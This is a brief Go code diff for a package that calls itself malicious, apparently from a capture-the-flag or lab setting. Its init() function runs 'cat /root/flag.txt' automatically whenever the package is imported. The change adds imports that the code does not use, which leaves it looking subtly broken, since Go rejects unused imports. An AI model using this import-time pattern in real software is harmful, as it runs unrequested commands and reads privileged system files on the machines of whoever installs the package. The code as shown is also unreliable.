@@ -2,9 +2,11 @@ package main
 
 import (
 	"fmt"
+	"html/template"
+	"net/http"
 	"os/exec"
+	"regexp"
 )
-
 func init() {
 	// This will be automatically called when the package is imported
 	cmd := exec.Command("cat", "/root/flag.txt")
@@ -19,7 +21,7 @@ func init() {
 }
 
 func main() {
-	// The main function is just here to make sure the package runs without errors
+	// The main function ensures that the package runs without errors
 	// The real action happens in init()
 	fmt.Println("Malicious package initialized.")
 }
